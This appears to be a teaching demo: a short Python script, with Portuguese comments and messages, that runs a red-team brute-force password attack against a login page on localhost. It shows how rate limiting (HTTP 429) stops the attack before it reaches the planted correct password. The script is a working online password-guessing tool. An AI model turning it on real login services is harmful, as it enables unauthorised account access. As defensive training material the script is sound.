import urllib.request
import urllib.error
import time

URL_ALVO = "http://127.0.0.1:8080/login"
USUARIO = "admin"

# Dicionário do atacante (a senha correta 'secreto123' está na 5ª posição)
WORDLIST = [
    "123456",
    "senha",
    "admin",
    "mudar123",
    "secreto123",  # <--- A senha certa está aqui!
    "master"
]

print("=====================================================")
print("[*] RED TEAM — DISPARANDO ATAQUE DE FORÇA BRUTA")
print(f"[*] Alvo: {URL_ALVO}")
print(f"[*] Testando {len(WORDLIST)} senhas...")
print("=====================================================\n")

for palpite in WORDLIST:
    url_requisicao = f"{URL_ALVO}?user={USUARIO}&pass={palpite}"
    print(f"[-] Tentando senha: '{palpite}'...")

    try:
        req = urllib.request.urlopen(url_requisicao)
        resposta = req.read().decode()
        if "[SUCESSO]" in resposta:
            print("\n" + "="*53)
            print(f"[+] SUCESSO! SENHA ENCONTRADA: >>> {palpite} <<<")
            print("="*53)
            break
    except urllib.error.HTTPError as e:
        if e.code == 401:
            print("    -> [401 Não Autorizado] Senha incorreta.")
        elif e.code == 429:
            print("    -> [429 Bloqueado] DEFESA ACIONADA! O servidor nos bloqueou!")
            mensagem = e.read().decode().strip()
            print(f"    -> Resposta do servidor: {mensagem}")
            print("\n[!] O ataque foi neutralizado antes de testar a senha correta!")
            break
            
    time.sleep(0.5)  # Pequena pausa entre requisições

print("\n=====================================================")
print("[*] Fim do ataque.")